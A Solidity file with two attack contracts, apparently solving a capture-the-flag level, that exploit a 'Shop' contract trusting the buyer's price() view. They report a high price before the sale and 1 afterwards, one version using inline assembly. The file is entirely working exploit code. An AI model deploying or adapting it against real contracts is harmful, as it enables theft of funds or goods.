contract ShopAttack {
    Shop target;
    
    constructor(address _target) public {
        target = Shop(_target);
    }
    
    function price() external view returns (uint) {
        if(target.isSold()) {
            return 1;
        } else {
            return 101;
        }
    }
    
    function buy() public {
        target.buy();
    }
}

contract ShopAttack2 {
    Shop target;
    
    constructor(address _target) public {
        target = Shop(_target);
    }
    
    function price() external view returns (uint) {
        
        assembly {
	          // function signature as parameter
            mstore(0, 0xe852e74100000000000000000000000000000000000000000000000000000000)
            pop(staticcall(gas(), sload(0), 0, 32, 32, 32)) 
            
            let r := mload(32)
            if iszero(r) {
                mstore(64, 101)
                return(64, 32)
            }
            mstore(64, 1)
            return(64, 32)
        }
    }
    
    function buy() public {
        target.buy();
    }
}
